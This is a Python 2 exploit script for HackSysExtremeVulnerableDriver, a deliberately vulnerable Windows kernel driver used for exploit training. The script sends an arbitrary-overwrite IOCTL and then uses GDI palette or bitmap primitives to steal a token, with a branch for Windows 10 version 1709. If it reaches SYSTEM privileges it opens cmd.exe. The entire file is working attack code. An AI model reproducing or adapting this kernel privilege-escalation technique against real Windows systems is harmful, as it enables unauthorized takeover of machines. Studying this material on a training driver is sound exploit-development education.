from kex import *
from ctypes import *
from ctypes.wintypes import *
import struct, sys, os, time, platform


if __name__ == '__main__':
	print "[*] HackSysExtremeVulnerableDriver Arbitrary Overwrite privilige escalation"
	
	IOCTL_VULN	= 0x0022200b # 
	DEVICE_NAME   = "\\\\.\\HackSysExtremeVulnerableDriver"
	dwReturn	  = c_ulong()
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
	if driver_handle == INVALID_HANDLE_VALUE:
		print "[-] Coudn't open driver, exiting..."
		sys.exit(-1)

	if platform.platform() == 'Windows-10-10.0.16299': #OS is Win10 v1709 (RS3)
		(what, where, manager_palette_handle, worker_palette_handle) = get_www_address_and_palettes()
	else:
		(what, where, manager_bitmap_handle, worker_bitmap_handle) = get_www_address_and_bitmaps()

	input = struct.pack("<Q", addressof(what)) 
	input += struct.pack("<Q", where) 

	inputbuffer = id(input) + 32
	print "[*] Input buffer is at: %s" % hex(inputbuffer)
	inputbuffer_size  = len(input)
	outputbuffer_size = 0x0
	IoStatusBlock = c_ulong()
	print "[*] Talking to the driver sending vulnerable IOCTL..."
	dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
								   None,
								   None,
								   None,
								   byref(IoStatusBlock),
								   IOCTL_VULN,
								   inputbuffer,
								   inputbuffer_size,
								   None,
								   0x0
								   )
	if platform.platform() == 'Windows-10-10.0.16299': #OS is Win10 v1709 (RS3)
		tokenstealing_with_palettes(manager_palette_handle, worker_palette_handle)
	else:
		tokenstealing_with_bitmaps(manager_bitmap_handle, worker_bitmap_handle)

	if shell32.IsUserAnAdmin():
		print "[+] We got SYSTEM!!"
		os.system('cmd.exe')
	else:
		print "[-] Something went wrong with the exploit, no SYSTEM"
